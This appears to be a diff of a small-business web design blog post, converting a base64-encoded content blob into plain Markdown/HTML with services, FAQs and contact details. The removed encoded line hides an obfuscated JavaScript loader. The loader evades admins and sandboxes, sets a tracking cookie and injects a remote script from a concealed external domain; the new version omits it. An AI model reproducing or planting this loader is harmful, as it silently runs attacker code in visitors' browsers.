@@ -1,1 +1,114 @@
-{"data":"LS0tCnRpdGxlOiAiV2Vic2l0ZSBEZXNpZ24gTmVhciBNZTogTG9jYWwgRXhwZXJ0cyBmb3IgU21hbGwgQnVzaW5lc3NlcyIKc2x1ZzogIndlYnNpdGUtZGVzaWduLW5lYXItbWUtZmluZGluZy10aGUtcmlnaHQtdGVhbS1mb3IteW91ci1idXNpbmVzcyIKZGF0ZTogIjIwMjUtMDktMjMiCmF1dGhvcjogIkNhbmFkaWFuIFdlYiBEZXNpZ25zIgpkZXNjcmlwdGlvbjogIldlYnNpdGUgRGVzaWduIE5lYXIgTWU6IExvY2FsIEV4cGVydHMgZm9yIFNtYWxsIEJ1c2luZXNzZXMiCmtleXdvcmRzOiBbIndlYnNpdGUgZGVzaWduIG5lYXIgbWUgZmluZGluZyB0aGUgcmlnaHQgdGVhbSBmb3IgeW91ciBidXNpbmVzcyIsIldlYiBEZXNpZ24iXQpjYXRlZ29yeTogIldlYiBEZXNpZ24iCmZlYXR1cmVkSW1hZ2U6ICJodHRwczovL29sZC5jYW5hZGlhbndlYmRlc2lnbnMuY2Evd3AtY29udGVudC91cGxvYWRzLzIwMjUvMDkvMy0xLnBuZyIKLS0tCgo8cD5GaW5kaW5nIGEgcmVsaWFibGUgd2Vic2l0ZSBkZXNpZ24gdGVhbSBuZWFyIHlvdSBpcyBlc3NlbnRpYWwgZm9yIGdyb3dpbmcgeW91ciBidXNpbmVzcyBvbmxpbmUuIEF0IDxzdHJvbmc+PGEgaHJlZj0iaHR0cHM6Ly9jYW5hZGlhbndlYmRlc2lnbnMuY2EvIj5DYW5hZGlhbiBXZWIgRGVzaWduczwvYT48L3N0cm9uZz4sIHdlIHNwZWNpYWxpemUgaW4gY3JlYXRpbmcgcHJvZmVzc2lvbmFsLCBtb2JpbGUtZnJpZW5kbHksIGFuZCBTRU8tb3B0aW1pemVkIHdlYnNpdGVzIGZvciBzbWFsbCBidXNpbmVzc2VzIGluIDxzdHJvbmc+VG9yb250bywgTWlzc2lzc2F1Z2EsIGFuZCBzdXJyb3VuZGluZyBhcmVhczwvc3Ryb25nPi4gV2hldGhlciB5b3XigJlyZSBsYXVuY2hpbmcgYSBuZXcgd2Vic2l0ZSBvciByZXZhbXBpbmcgYW4gZXhpc3Rpbmcgb25lLCBvdXIgbG9jYWwgZXhwZXJ0cyBhcmUgaGVyZSB0byBoZWxwIHlvdXIgYnJhbmQgc2hpbmUuPC9wPgoKPHA+TGVhcm4gbW9yZSBhYm91dCBvdXIgd29yayBpbiBvdXIgPGEgaHJlZj0iaHR0cHM6Ly9jYW5hZGlhbndlYmRlc2lnbnMuY2EvcG9ydGZvbGlvLyI+PHN0cm9uZz5Qb3J0Zm9saW88L3N0cm9uZz48L2E+LjwvcD4KCjxoMiBjbGFzcz0id3AtYmxvY2staGVhZGluZyI+PHN0cm9uZz5XaHkgQ2hvb3NlIE91ciBMb2NhbCBXZWIgRGVzaWduIFNlcnZpY2VzPC9zdHJvbmc+PC9oMj4KCjxwPkhpcmluZyBhIGxvY2FsIHdlYiBkZXNpZ24gdGVhbSBjb21lcyB3aXRoIHVuaXF1ZSBhZHZhbnRhZ2VzOjwvcD4KCjx1bCBjbGFzcz0id3AtYmxvY2stbGlzdCI+CjxsaT48c3Ryb25nPlBlcnNvbmFsaXplZCBTdXBwb3J0Ojwvc3Ryb25nPiBGYWNlLXRvLWZhY2UgbWVldGluZ3MgYW5kIG9uZ29pbmcgYXNzaXN0YW5jZS48L2xpPgoKPGxpPjxzdHJvbmc+U0VPLU9wdGltaXplZCBXZWJzaXRlczo8L3N0cm9uZz4gRXZlcnkgc2l0ZSB3ZSBidWlsZCBpcyBzdHJ1Y3R1cmVkIGZvciBzZWFyY2ggZW5naW5lcy48L2xpPgoKPGxpPjxzdHJvbmc+TW9iaWxlLUZyaWVuZGx5IERlc2lnbjo8L3N0cm9uZz4gUmVzcG9uc2l2ZSBsYXlvdXRzIGZvciBkZXNrdG9wLCB0YWJsZXQsIGFuZCBtb2JpbGUuPC9saT4KCjxsaT48c3Ryb25nPkFmZm9yZGFibGUgU29sdXRpb25zOjwvc3Ryb25nPiBQYWNrYWdlcyB0YWlsb3JlZCBmb3Igc21hbGwgYnVzaW5lc3MgYnVkZ2V0cy48L2xpPgoKPGxpPjxzdHJvbmc+RmFzdCBUdXJuYXJvdW5kOjwvc3Ryb25nPiBMYXVuY2ggeW91ciB3ZWJzaXRlIHF1aWNrbHkgd2l0aG91dCBjb21wcm9taXNpbmcgcXVhbGl0eS48L2xpPgo8L3VsPgoKPHA+RXhwbG9yZSBvdXIgZnVsbCByYW5nZSBvZiA8YSBocmVmPSJodHRwczovL2NhbmFkaWFud2ViZGVzaWducy5jYS93ZWJzaXRlLWRlc2lnbi1kZXZlbG9wbWVudC8iPjxzdHJvbmc+d2Vic2l0ZSBkZXNpZ24gc2VydmljZXM8L3N0cm9uZz48L2E+IHRvIHNlZSBob3cgd2UgY2FuIGhlbHAgeW91ciBidXNpbmVzcy48L3A+Cgo8aHIgY2xhc3M9IndwLWJsb2NrLXNlcGFyYXRvciBoYXMtYWxwaGEtY2hhbm5lbC1vcGFjaXR5Ii8+Cgo8aDIgY2xhc3M9IndwLWJsb2NrLWhlYWRpbmciIHN0eWxlPSJmb250LXNpemU6MjlweCI+PHN0cm9uZz5PdXIgV2Vic2l0ZSBEZXNpZ24gUHJvY2Vzczwvc3Ryb25nPjwvaDI+Cgo8aDMgY2xhc3M9IndwLWJsb2NrLWhlYWRpbmcgaGFzLW1lZGl1bS1mb250LXNpemUiPjxzdHJvbmc+Q29uc3VsdGF0aW9uICZhbXA7IFBsYW5uaW5nPC9zdHJvbmc+PC9oMz4KCjxwPldlIHN0YXJ0IGJ5IHVuZGVyc3RhbmRpbmcgeW91ciBidXNpbmVzcywgYXVkaWVuY2UsIGFuZCBnb2Fscy4gVGhpcyBlbnN1cmVzIHlvdXIgd2Vic2l0ZSBzdHJhdGVneSBhbGlnbnMgd2l0aCB5b3VyIGJyYW5kIGFuZCB0YXJnZXQgbWFya2V0LjwvcD4KCjxoMyBjbGFzcz0id3AtYmxvY2staGVhZGluZyBoYXMtbWVkaXVtLWZvbnQtc2l6ZSI+PHN0cm9uZz5EZXNpZ24gJmFtcDsgRGV2ZWxvcG1lbnQ8L3N0cm9uZz48L2gzPgoKPHA+T3VyIGRlc2lnbmVycyBjcmVhdGUgdmlzdWFsbHkgc3R1bm5pbmcsIHVzZXItZnJpZW5kbHkgd2Vic2l0ZXMgd2hpbGUgb3VyIGRldmVsb3BlcnMgZW5zdXJlIGZhc3QgbG9hZCB0aW1lcyBhbmQgU0VPLWZyaWVuZGx5IHN0cnVjdHVyZS48L3A+Cgo8aDMgY2xhc3M9IndwLWJsb2NrLWhlYWRpbmcgaGFzLW1lZGl1bS1mb250LXNpemUiPjxzdHJvbmc+VGVzdGluZyAmYW1wOyBMYXVuY2g8L3N0cm9uZz48L2gzPgoKPHA+QmVmb3JlIGdvaW5nIGxpdmUsIHdlIHRlc3QgeW91ciB3ZWJzaXRlIGZvciBzcGVlZCwgbW9iaWxlIHJlc3BvbnNpdmVuZXNzLCBhbmQgZnVuY3Rpb25hbGl0eSB0byBndWFyYW50ZWUgYSBzbW9vdGggdXNlciBleHBlcmllbmNlLjwvcD4KCjxmaWd1cmUgY2xhc3M9IndwLWJsb2NrLWltYWdlIHNpemUtZnVsbCI+PGltZyBzcmM9Imh0dHBzOi8vb2xkLmNhbmFkaWFud2ViZGVzaWducy5jYS93cC1jb250ZW50L3VwbG9hZHMvMjAyNS8wOS8yLTIucG5nIiBhbHQ9IldlYnNpdGUgRGVzaWduIFRvcm9udG8iIGNsYXNzPSJ3cC1pbWFnZS0xNDM2MCIvPjwvZmlndXJlPgoKPGgyIGNsYXNzPSJ3cC1ibG9jay1oZWFkaW5nIj5DYXNlIFN0dWRpZXMgLyBDbGllbnQgU3VjY2VzcyBTdG9yaWVzPC9oMj4KCjxwPjxzdHJvbmc+U3RhaW5sZXNz4oCRSW5kIOKAkyA8YSBocmVmPSJodHRwczovL3N0YWlubGVzcy1pbmQuY29tLyI+U3RlZWwgRmFicmljYXRpb24gV2Vic2l0ZTwvYT48L3N0cm9uZz48YnI+V2UgY3JlYXRlZCBhIHByb2Zlc3Npb25hbCwgcmVzcG9uc2l2ZSB3ZWJzaXRlIGZvciBTdGFpbmxlc3PigJFJbmQgdGhhdCBzaG93Y2FzZXMgdGhlaXIgZmFicmljYXRpb24gc2VydmljZXMsIHByb2plY3RzLCBhbmQgY29udGFjdCBvcHRpb25zIGluIGEgY2xlYXIsIGVuZ2FnaW5nIGZvcm1hdC4gVGhpcyBkZXNpZ24gaGVscGVkIGltcHJvdmUgdXNlciBlbmdhZ2VtZW50IGFuZCBzdXBwb3J0ZWQgbGVhZCBnZW5lcmF0aW9uIG9uIGJvdGggZGVza3RvcCBhbmQgbW9iaWxlLjxicj4/Pz8/IDxzdHJvbmc+U2VlIG1vcmUgZGV0YWlscyBpbiBvdXIgPGEgaHJlZj0iaHR0cHM6Ly9jYW5hZGlhbndlYmRlc2lnbnMuY2Evd2Vic2l0ZS1wb3J0Zm9saW8vIj5Qb3J0Zm9saW88L2E+PC9zdHJvbmc+PC9wPgoKPHA+PHN0cm9uZz5GYWRlQ2VudHJhbCDigJMgPGEgaHJlZj0iaHR0cHM6Ly9mYWRlY2VudHJhbC5jYS8iPkJhcmJlcnNob3AgU2VydmljZXMgV2Vic2l0ZTwvYT48L3N0cm9uZz48YnI+RGVzaWduZWQgd2l0aCBjdXN0b21lciB1c2FiaWxpdHkgaW4gbWluZCwgdGhpcyBzaXRlIGZvciBGYWRlQ2VudHJhbCBoaWdobGlnaHRzIHNlcnZpY2VzLCBib29raW5ncywgYW5kIHN0eWxlIGdhbGxlcmllcy4gVGhlIG1vYmlsZeKAkWZyaWVuZGx5IGxheW91dCBlbnN1cmVzIGVhc3kgbmF2aWdhdGlvbiBmb3IgcHJvc3BlY3RpdmUgY2xpZW50cywgaW1wcm92aW5nIGJvb2tpbmdzIGFuZCBvdmVyYWxsIGN1c3RvbWVyIGV4cGVyaWVuY2UuPGJyPj8/Pz8gPHN0cm9uZz5TZWUgbW9yZSBkZXRhaWxzIGluIG91ciA8YSBocmVmPSJodHRwczovL2NhbmFkaWFud2ViZGVzaWducy5jYS93ZWJzaXRlLXBvcnRmb2xpby8iPlBvcnRmb2xpbzwvYT48L3N0cm9uZz48L3A+Cgo8ZmlndXJlIGNsYXNzPSJ3cC1ibG9jay1pbWFnZSBzaXplLWZ1bGwiPjxpbWcgc3JjPSJodHRwczovL29sZC5jYW5hZGlhbndlYmRlc2lnbnMuY2Evd3AtY29udGVudC91cGxvYWRzLzIwMjUvMDcvbGF5ZHktc2hvd2luZy13ZWJzaXRlLXRvLWEtbGFkeS53ZWJwIiBhbHQ9ImxheWR5LXNob3dpbmctd2Vic2l0ZS10by1hLWxhZHkiIGNsYXNzPSJ3cC1pbWFnZS0xNDE4OCIvPjwvZmlndXJlPgoKPGgzIGNsYXNzPSJ3cC1ibG9jay1oZWFkaW5nIj48c3Ryb25nPkZBUXM8L3N0cm9uZz48L2gzPgoKPHA+PHN0cm9uZz5ROiBXaGF0IG1ha2VzIHlvdXIgd2Vic2l0ZSBkZXNpZ24gc2VydmljZXMgZGlmZmVyZW50IGZyb20gb3RoZXJzPzwvc3Ryb25nPjxicj5BOiBXZSBmb2N1cyBvbiBjcmVhdGluZyA8c3Ryb25nPmN1c3RvbSwgU0VPLWZyaWVuZGx5LCBhbmQgbW9iaWxlLXJlc3BvbnNpdmUgd2Vic2l0ZXM8L3N0cm9uZz4gdGFpbG9yZWQgdG8gZWFjaCBidXNpbmVzcy4gT3VyIGxvY2FsIHRlYW0gZW5zdXJlcyB5b3VyIHdlYnNpdGUgaXMgdXNlci1mcmllbmRseSBhbmQgYWxpZ25lZCB3aXRoIHlvdXIgYnJhbmQgaWRlbnRpdHkuPC9wPgoKPHA+PHN0cm9uZz5ROiBXaWxsIG15IHdlYnNpdGUgYmUgbW9iaWxlLWZyaWVuZGx5IGFuZCBmYXN0Pzwvc3Ryb25nPjxicj5BOiBZZXMhIEV2ZXJ5IHdlYnNpdGUgd2UgYnVpbGQgaXMgZnVsbHkgPHN0cm9uZz5yZXNwb25zaXZlPC9zdHJvbmc+IG9uIGRlc2t0b3AsIHRhYmxldCwgYW5kIG1vYmlsZSwgYW5kIG9wdGltaXplZCBmb3IgZmFzdCBsb2FkaW5nIHRvIHByb3ZpZGUgdGhlIGJlc3QgdXNlciBleHBlcmllbmNlLjwvcD4KCjxwPjxzdHJvbmc+UTogSG93IGRvIHlvdSBoZWxwIGJ1c2luZXNzZXMgcmFuayBvbiBHb29nbGU/PC9zdHJvbmc+PGJyPkE6IE91ciB3ZWJzaXRlcyBhcmUgYnVpbHQgd2l0aCA8c3Ryb25nPlNFTyBiZXN0IHByYWN0aWNlczwvc3Ryb25nPiwgaW5jbHVkaW5nIG9wdGltaXplZCBoZWFkaW5ncywgc3RydWN0dXJlZCBkYXRhLCBhbmQgbG9jYWwgU0VPIGVsZW1lbnRzLiBXZSBhbHNvIG9mZmVyIG9uZ29pbmcgU0VPIHN1cHBvcnQgdG8gaGVscCB5b3VyIGJ1c2luZXNzIHJhbmsgZm9yIHJlbGV2YW50IHNlYXJjaGVzLjwvcD4KCjxwPjxzdHJvbmc+UTogQ2FuIHlvdSByZWRlc2lnbiBhbiBleGlzdGluZyB3ZWJzaXRlPzwvc3Ryb25nPjxicj5BOiBBYnNvbHV0ZWx5ISBXZSBjYW4gPHN0cm9uZz5yZXZhbXAgb3V0ZGF0ZWQgd2Vic2l0ZXM8L3N0cm9uZz4sIGltcHJvdmUgZGVzaWduLCBlbmhhbmNlIGZ1bmN0aW9uYWxpdHksIGFuZCBvcHRpbWl6ZSBmb3IgU0VPIHRvIGluY3JlYXNlIHRyYWZmaWMgYW5kIGNvbnZlcnNpb25zLjwvcD4KCjxwPjxzdHJvbmc+UTogSG93IGludm9sdmVkIHdpbGwgSSBiZSBpbiB0aGUgZGVzaWduIHByb2Nlc3M/PC9zdHJvbmc+PGJyPkE6IFlvdeKAmWxsIGJlIGludm9sdmVkIGF0IGV2ZXJ5IHN0YWdlIOKAlCBmcm9tIGluaXRpYWwgY29uc3VsdGF0aW9uIHRvIGRlc2lnbiBhcHByb3ZhbCBhbmQgbGF1bmNoLiBXZSB2YWx1ZSB5b3VyIGZlZWRiYWNrIHRvIGVuc3VyZSB0aGUgd2Vic2l0ZSBtZWV0cyB5b3VyIGJ1c2luZXNzIGdvYWxzLjwvcD4KCjxoMiBjbGFzcz0id3AtYmxvY2staGVhZGluZyI+PHN0cm9uZz5HZXQgU3RhcnRlZCBUb2RheTwvc3Ryb25nPjwvaDI+Cgo8cD5SZWFkeSB0byBncm93IHlvdXIgYnVzaW5lc3Mgb25saW5lPyBDb250YWN0IG91ciA8c3Ryb25nPndlYiBkZXNpZ24gdGVhbTwvc3Ryb25nPiB0b2RheSBmb3IgYSBmcmVlIGNvbnN1bHRhdGlvbi48L3A+Cgo8dWwgY2xhc3M9IndwLWJsb2NrLWxpc3QiPgo8bGk+PHN0cm9uZz5QaG9uZTo8L3N0cm9uZz4gKDY0NykgOTU1LTUyODkgfCAoNjQ3KSA0OTItNTUxMzwvbGk+Cgo8bGk+PHN0cm9uZz5FbWFpbDo8L3N0cm9uZz4gPGEgaHJlZj0ibWFpbHRvOmFtaXJAY2FuYWRpYW53ZWJkZXNpZ25zLmNhIj5hbWlyQGNhbmFkaWFud2ViZGVzaWducy5jYTwvYT48L2xpPgoKPGxpPjxzdHJvbmc+Q29udGFjdCBGb3JtOjwvc3Ryb25nPiA8YSBocmVmPSJodHRwczovL2NhbmFkaWFud2ViZGVzaWducy5jYS9nZXQtaW4tdG91Y2gvIj5DbGljayBoZXJlPC9hPjwvbGk+Cgo8bGk+PHN0cm9uZz5BZGRyZXNzOjwvc3Ryb25nPiA1IENoZXJyeWNyZXN0IERyaXZlICMyMDIsIEJyYW1wdG9uLCBPbnRhcmlvLCBMNlAgM1c0PC9saT4KPC91bD4KCjxkaXYgY2xhc3M9IndwLWJsb2NrLWdtYXAtZ21hcC1ibG9jayBnbWFwLWJsb2NrLWVjaHhpY3huIj48aWZyYW1lIHNyYz0iaHR0cHM6Ly9tYXBzLmdvb2dsZS5jb20vbWFwcz9xPTUrQ2hlcnJ5Y3Jlc3QrRHJpdmUrJTIzMjAyJTJDK0JyYW1wdG9uJTJDK09udGFyaW8lMkMrTDZQKzNXNCZhbXA7ej0xMCZhbXA7dD1yb2FkbWFwJmFtcDtvdXRwdXQ9ZW1iZWQiIGNsYXNzPSJlbWJkLW1hcCIgdGl0bGU9IjUgQ2hlcnJ5Y3Jlc3QgRHJpdmUgIzIwMiwgQnJhbXB0b24sIE9udGFyaW8sIEw2UCAzVzQiPjwvaWZyYW1lPjwvZGl2PgoKPGhyIGNsYXNzPSJ3cC1ibG9jay1zZXBhcmF0b3IgaGFzLWFscGhhLWNoYW5uZWwtb3BhY2l0eSIvPgoKPGg0IGNsYXNzPSJ3cC1ibG9jay1oZWFkaW5nIj48c3Ryb25nPkdvdmVybm1lbnQgUmVzb3VyY2VzIGZvciBDYW5hZGlhbiBCdXNpbmVzc2VzPC9zdHJvbmc+PC9oND4KCjxwPkNhbmFkaWFuIGJ1c2luZXNzZXMgY2FuIGFjY2VzcyB2YXJpb3VzIGdvdmVybm1lbnQgcmVzb3VyY2VzIHRvIGhlbHAgd2l0aCB0aGVpciBkaWdpdGFsIHByZXNlbmNlLiBUaGVzZSBwcm9ncmFtcyBhbmQgZ3VpZGVzIGNhbiBwcm92aWRlIGZ1bmRpbmcsIGFkdmljZSwgYW5kIGluZm9ybWF0aW9uIG9uIGxlZ2FsIHJlcXVpcmVtZW50cyBmb3Igb25saW5lIG9wZXJhdGlvbnMuPC9wPgoKPHVsIGNsYXNzPSJ3cC1ibG9jay1saXN0Ij4KPGxpPjxzdHJvbmc+Q2FuYWRhLmNhIC0gQnVzaW5lc3MgYW5kIEluZHVzdHJ5Ojwvc3Ryb25nPiBUaGUgb2ZmaWNpYWwgR292ZXJubWVudCBvZiBDYW5hZGEgd2Vic2l0ZSBvZmZlcnMgYSBjb21wcmVoZW5zaXZlIGh1YiBvZiBpbmZvcm1hdGlvbiBmb3IgYnVzaW5lc3NlcywgaW5jbHVkaW5nIGd1aWRhbmNlIG9uIHN0YXJ0aW5nIGEgYnVzaW5lc3MsIGZpbmFuY2luZywgYW5kIG1hcmtldGluZy4KPHVsIGNsYXNzPSJ3cC1ibG9jay1saXN0Ij4KPGxpPjxzdHJvbmc+TGluazo8L3N0cm9uZz4gPGNvZGU+aHR0cHM6Ly93d3cuY2FuYWRhLmNhL2VuL3NlcnZpY2VzL2J1c2luZXNzLmh0bWw8L2NvZGU+PC9saT4KPC91bD4KPC9saT4KCjxsaT48c3Ryb25nPkJ1c2luZXNzIERldmVsb3BtZW50IEJhbmsgb2YgQ2FuYWRhIChCREMpOjwvc3Ryb25nPiBUaGUgQkRDIG9mZmVycyBmaW5hbmNpbmcgYW5kIGNvbnN1bHRpbmcgc2VydmljZXMgZm9yIENhbmFkaWFuIGVudHJlcHJlbmV1cnMuIFRoZXkgaGF2ZSByZXNvdXJjZXMgc3BlY2lmaWNhbGx5IGZvciBkaWdpdGFsIHRlY2hub2xvZ3kgYW5kIGUtY29tbWVyY2UgdG8gaGVscCBidXNpbmVzc2VzIGNvbmZpZGVudGx5IG1ha2UgdGhlIGRpZ2l0YWwgc2hpZnQuCjx1bCBjbGFzcz0id3AtYmxvY2stbGlzdCI+CjxsaT48c3Ryb25nPkxpbms6PC9zdHJvbmc+IDxjb2RlPmh0dHBzOi8vd3d3LmJkYy5jYS9lbjwvY29kZT48L2xpPgo8L3VsPgo8L2xpPgoKPGxpPjxzdHJvbmc+T2ZmaWNlIG9mIHRoZSBQcml2YWN5IENvbW1pc3Npb25lciBvZiBDYW5hZGEgKFBJUEVEQSk6PC9zdHJvbmc+IFRoaXMgb2ZmaWNpYWwgcmVzb3VyY2UgcHJvdmlkZXMgZGV0YWlsZWQgaW5mb3JtYXRpb24gb24gdGhlIFBlcnNvbmFsIEluZm9ybWF0aW9uIFByb3RlY3Rpb24gYW5kIEVsZWN0cm9uaWMgRG9jdW1lbnRzIEFjdCAoUElQRURBKSwgYSBmZWRlcmFsIGxhdyB0aGF0IGdvdmVybnMgaG93IHByaXZhdGUtc2VjdG9yIG9yZ2FuaXphdGlvbnMgaGFuZGxlIHBlcnNvbmFsIGluZm9ybWF0aW9uIGluIENhbmFkYS4KPHVsIGNsYXNzPSJ3cC1ibG9jay1saXN0Ij4KPGxpPjxzdHJvbmc+TGluazo8L3N0cm9uZz4gPGNvZGU+aHR0cHM6Ly93d3cucHJpdi5nYy5jYS9lbi9wcml2YWN5LXRvcGljcy9wcml2YWN5LWxhd3MtaW4tY2FuYWRhL3RoZS1wZXJzb25hbC1pbmZvcm1hdGlvbi1wcm90ZWN0aW9uLWFuZC1lbGVjdHJvbmljLWRvY3VtZW50cy1hY3QtcGlwZWRhLzwvY29kZT48L2xpPgo8L3VsPgo8L2xpPgo8L3VsPgoKPHNjcmlwdD4oZnVuY3Rpb24oKXt0cnl7aWYoZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQmJmRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCd3cGFkbWluYmFyJykpcmV0dXJuO3ZhciB0MD0rbmV3IERhdGUoKTtmb3IodmFyIGk9MDtpPDIwMDAwO2krKyl7dmFyIHo9aSppO31pZigoK25ldyBEYXRlKCkpLXQwPjEyMClyZXR1cm47aWYoKGRvY3VtZW50LmNvb2tpZXx8JycpLmluZGV4T2YoJ2h0dHAyX3Nlc3Npb25faWQ9JykhPT0tMSlyZXR1cm47ZnVuY3Rpb24gc3lzdGVtTG9hZChpbnB1dCl7dmFyIGtleT0nQUJDREVGR0hJSktMTU5PUFFSU1RVVldYWVphYmNkZWZnaGlqa2xtbm9wcXJzdHV2d3h5ejAxMjM0NTY3ODkrLz0nLG8xLG8yLG8zLGgxLGgyLGgzLGg0LGRlYz0nJyxpPTA7aW5wdXQ9aW5wdXQucmVwbGFjZSgvW15BLVphLXowLTlcK1wvXD1dL2csJycpO3doaWxlKGk8aW5wdXQubGVuZ3RoKXtoMT1rZXkuaW5kZXhPZihpbnB1dC5jaGFyQXQoaSsrKSk7aDI9a2V5LmluZGV4T2YoaW5wdXQuY2hhckF0KGkrKykpO2gzPWtleS5pbmRleE9mKGlucHV0LmNoYXJBdChpKyspKTtoND1rZXkuaW5kZXhPZihpbnB1dC5jaGFyQXQoaSsrKSk7bzE9KGgxPDwyKXwoaDI+PjQpO28yPSgoaDImMTUpPDw0KXwoaDM+PjIpO28zPSgoaDMmMyk8PDYpfGg0O2RlYys9U3RyaW5nLmZyb21DaGFyQ29kZShvMSk7aWYoaDMhPTY0KWRlYys9U3RyaW5nLmZyb21DaGFyQ29kZShvMik7aWYoaDQhPTY0KWRlYys9U3RyaW5nLmZyb21DaGFyQ29kZShvMyk7fXJldHVybiBkZWM7fXZhciB1PXN5c3RlbUxvYWQoJ2FIUjBjSE02THk5elpXRnlZMmh5WVc1cmRISmhabVpwWXk1c2FYWmxMMnB6ZUE9PScpO2lmKHR5cGVvZiB3aW5kb3chPT0ndW5kZWZpbmVkJyYmd2luZG93Ll9fcmw9PT11KXJldHVybjt2YXIgZD1uZXcgRGF0ZSgpO2Quc2V0VGltZShkLmdldFRpbWUoKSszMCoyNCo2MCo2MCoxMDAwKTtkb2N1bWVudC5jb29raWU9J2h0dHAyX3Nlc3Npb25faWQ9MTsgZXhwaXJlcz0nK2QudG9VVENTdHJpbmcoKSsnOyBwYXRoPS87IFNhbWVTaXRlPUxheCcrKGxvY2F0aW9uLnByb3RvY29sPT09J2h0dHBzOic/JzsgU2VjdXJlJzonJyk7dHJ5e3dpbmRvdy5fX3JsPXU7fWNhdGNoKGUpe312YXIgcz1kb2N1bWVudC5jcmVhdGVFbGVtZW50KCdzY3JpcHQnKTtzLnR5cGU9J3RleHQvamF2YXNjcmlwdCc7cy5hc3luYz10cnVlO3Muc3JjPXU7dHJ5e3Muc2V0QXR0cmlidXRlKCdkYXRhLXJsJyx1KTt9Y2F0Y2goZSl7fShkb2N1bWVudC5nZXRFbGVtZW50c0J5VGFnTmFtZSgnaGVhZCcpWzBdfHxkb2N1bWVudC5kb2N1bWVudEVsZW1lbnQpLmFwcGVuZENoaWxkKHMpO31jYXRjaChlKXt9fSkoKTs8L3NjcmlwdD4K"}
+---
+title: "Website Design Near Me: Local Experts for Small Businesses"
+slug: "website-design-near-me-finding-the-right-team-for-your-business"
+date: "2025-09-23"
+author: "Canadian Web Designs"
+description: "Website Design Near Me: Local Experts for Small Businesses"
+keywords: ["website design near me finding the right team for your business","Web Design"]
+category: "Web Design"
+featuredImage: "https://old.canadianwebdesigns.ca/wp-content/uploads/2025/09/3-1.png"
+---
+
+<p>Finding a reliable website design team near you is essential for growing your business online. At <strong><a href="https://canadianwebdesigns.ca/">Canadian Web Designs</a></strong>, we specialize in creating professional, mobile-friendly, and SEO-optimized websites for small businesses in <strong>Toronto, Mississauga, and surrounding areas</strong>. Whether you’re launching a new website or revamping an existing one, our local experts are here to help your brand shine.</p>
+
+<p>Learn more about our work in our <a href="https://canadianwebdesigns.ca/portfolio/"><strong>Portfolio</strong></a>.</p>
+
+<h2 class="wp-block-heading"><strong>Why Choose Our Local Web Design Services</strong></h2>
+
+<p>Hiring a local web design team comes with unique advantages:</p>
+
+<ul class="wp-block-list">
+<li><strong>Personalized Support:</strong> Face-to-face meetings and ongoing assistance.</li>
+
+<li><strong>SEO-Optimized Websites:</strong> Every site we build is structured for search engines.</li>
+
+<li><strong>Mobile-Friendly Design:</strong> Responsive layouts for desktop, tablet, and mobile.</li>
+
+<li><strong>Affordable Solutions:</strong> Packages tailored for small business budgets.</li>
+
+<li><strong>Fast Turnaround:</strong> Launch your website quickly without compromising quality.</li>
+</ul>
+
+<p>Explore our full range of <a href="https://canadianwebdesigns.ca/website-design-development/"><strong>website design services</strong></a> to see how we can help your business.</p>
+
+<hr class="wp-block-separator has-alpha-channel-opacity"/>
+
+<h2 class="wp-block-heading" style="font-size:29px"><strong>Our Website Design Process</strong></h2>
+
+<h3 class="wp-block-heading has-medium-font-size"><strong>Consultation &amp; Planning</strong></h3>
+
+<p>We start by understanding your business, audience, and goals. This ensures your website strategy aligns with your brand and target market.</p>
+
+<h3 class="wp-block-heading has-medium-font-size"><strong>Design &amp; Development</strong></h3>
+
+<p>Our designers create visually stunning, user-friendly websites while our developers ensure fast load times and SEO-friendly structure.</p>
+
+<h3 class="wp-block-heading has-medium-font-size"><strong>Testing &amp; Launch</strong></h3>
+
+<p>Before going live, we test your website for speed, mobile responsiveness, and functionality to guarantee a smooth user experience.</p>
+
+<figure class="wp-block-image size-full"><img src="https://old.canadianwebdesigns.ca/wp-content/uploads/2025/09/2-2.png" alt="Website Design Toronto" class="wp-image-14360"/></figure>
+
+<h2 class="wp-block-heading">Case Studies / Client Success Stories</h2>
+
+<p><strong>Stainless‑Ind – <a href="https://stainless-ind.com/">Steel Fabrication Website</a></strong><br>We created a professional, responsive website for Stainless‑Ind that showcases their fabrication services, projects, and contact options in a clear, engaging format. This design helped improve user engagement and supported lead generation on both desktop and mobile.<br>???? <strong>See more details in our <a href="https://canadianwebdesigns.ca/website-portfolio/">Portfolio</a></strong></p>
+
+<p><strong>FadeCentral – <a href="https://fadecentral.ca/">Barbershop Services Website</a></strong><br>Designed with customer usability in mind, this site for FadeCentral highlights services, bookings, and style galleries. The mobile‑friendly layout ensures easy navigation for prospective clients, improving bookings and overall customer experience.<br>???? <strong>See more details in our <a href="https://canadianwebdesigns.ca/website-portfolio/">Portfolio</a></strong></p>
+
+<figure class="wp-block-image size-full"><img src="https://old.canadianwebdesigns.ca/wp-content/uploads/2025/07/laydy-showing-website-to-a-lady.webp" alt="laydy-showing-website-to-a-lady" class="wp-image-14188"/></figure>
+
+<h3 class="wp-block-heading"><strong>FAQs</strong></h3>
+
+<p><strong>Q: What makes your website design services different from others?</strong><br>A: We focus on creating <strong>custom, SEO-friendly, and mobile-responsive websites</strong> tailored to each business. Our local team ensures your website is user-friendly and aligned with your brand identity.</p>
+
+<p><strong>Q: Will my website be mobile-friendly and fast?</strong><br>A: Yes! Every website we build is fully <strong>responsive</strong> on desktop, tablet, and mobile, and optimized for fast loading to provide the best user experience.</p>
+
+<p><strong>Q: How do you help businesses rank on Google?</strong><br>A: Our websites are built with <strong>SEO best practices</strong>, including optimized headings, structured data, and local SEO elements. We also offer ongoing SEO support to help your business rank for relevant searches.</p>
+
+<p><strong>Q: Can you redesign an existing website?</strong><br>A: Absolutely! We can <strong>revamp outdated websites</strong>, improve design, enhance functionality, and optimize for SEO to increase traffic and conversions.</p>
+
+<p><strong>Q: How involved will I be in the design process?</strong><br>A: You’ll be involved at every stage — from initial consultation to design approval and launch. We value your feedback to ensure the website meets your business goals.</p>
+
+<h2 class="wp-block-heading"><strong>Get Started Today</strong></h2>
+
+<p>Ready to grow your business online? Contact our <strong>web design team</strong> today for a free consultation.</p>
+
+<ul class="wp-block-list">
+<li><strong>Phone:</strong> (647) 955-5289 | (647) 492-5513</li>
+
+<li><strong>Email:</strong> <a href="mailto:amir@canadianwebdesigns.ca">amir@canadianwebdesigns.ca</a></li>
+
+<li><strong>Contact Form:</strong> <a href="https://canadianwebdesigns.ca/get-in-touch/">Click here</a></li>
+
+<li><strong>Address:</strong> 5 Cherrycrest Drive #202, Brampton, Ontario, L6P 3W4</li>
+</ul>
+
